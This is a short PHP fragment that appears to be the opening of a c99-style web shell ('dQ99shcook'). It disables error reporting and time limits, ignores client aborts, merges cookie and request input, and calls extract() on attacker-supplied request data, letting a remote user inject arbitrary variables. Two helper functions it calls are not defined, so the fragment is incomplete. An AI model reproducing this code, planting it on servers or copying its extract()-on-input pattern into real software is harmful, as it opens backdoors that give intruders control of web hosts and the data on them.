<?php
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No dQ in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) { strips($GLOBALS); }
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
@$f = $_REQUEST["f"];
@extract($_REQUEST["dQ99shcook"]);

?>